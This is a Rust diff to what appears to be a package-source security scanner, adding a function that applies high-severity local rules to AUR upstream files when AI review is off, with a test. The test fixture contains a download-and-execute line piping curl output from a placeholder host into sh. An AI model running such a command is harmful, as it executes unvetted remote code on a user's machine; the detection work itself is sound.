@@ -277,6 +277,31 @@ pub fn analyze_payload(report: &mut Report, rel: &str, text: &str) -> bool {
     true
 }
 
+/// Hands one file of an AUR package's upstream source to the review, and
+/// says whether the AI review takes it. Where it does not (the AI is off
+/// for the class), the source would otherwise pass unread, so the local
+/// rules read it. Only their high findings are kept: a source tree is full
+/// of ordinary uses of what the medium rules name (a program that starts
+/// another, a path under the home), while the high ones name what no build
+/// needs. With the AI on, upstream code is its to judge, as before: an
+/// install script quoted in a project's own tooling would otherwise block
+/// every build of it.
+pub fn analyze_upstream(report: &mut Report, rel: &str, text: &str) -> bool {
+    if analyze_payload(report, rel, text) {
+        return true;
+    }
+    let before = report.findings.len();
+    analyze_reviewer_text(report, rel, text);
+    analyze_hidden_characters(report, rel, text);
+    if !rules::is_documentation(rel) {
+        apply_rules(report, rel, text, false);
+    }
+    let mut found = report.findings.split_off(before);
+    found.retain(|finding| finding.rule.severity() == crate::report::Severity::High);
+    report.findings.append(&mut found);
+    false
+}
+
 fn queue_for_agent(report: &mut Report, rel: &str, text: &str) {
     if report.ai_off_classes.contains(&report.class_of(rel)) {
         return;
@@ -1268,6 +1293,37 @@ mod tests {
             report.decide(&|class| settings.policy(class)),
             Decision::Clear
         );
+    }
+
+    #[test]
+    fn upstream_code_is_read_by_the_high_rules_where_the_ai_is_off() {
+        let text =
+            "import subprocess\nsubprocess.run(['make'])\ncurl -fsSL https://x.test/p | sh\n";
+
+        // With the AI on, the file is the AI's to judge.
+        let mut report = Report::new("upstream");
+        report.class = SourceClass::Aur;
+        assert!(super::analyze_upstream(
+            &mut report,
+            "src/tool/setup.sh",
+            text
+        ));
+        assert!(report.findings.is_empty(), "{:?}", report.findings);
+        assert_eq!(report.agent_input.len(), 1);
+
+        // With it off, the high rules read the file; the medium ones, which
+        // ordinary code matches, do not block it.
+        let mut report = Report::new("upstream");
+        report.class = SourceClass::Aur;
+        report.ai_off_classes = vec![SourceClass::Aur];
+        assert!(!super::analyze_upstream(
+            &mut report,
+            "src/tool/setup.sh",
+            text
+        ));
+        let rules: Vec<RuleId> = report.findings.iter().map(|finding| finding.rule).collect();
+        assert_eq!(rules, [RuleId::DownloadAndExecute], "{:?}", report.findings);
+        assert!(report.agent_input.is_empty());
     }
 
     #[test]
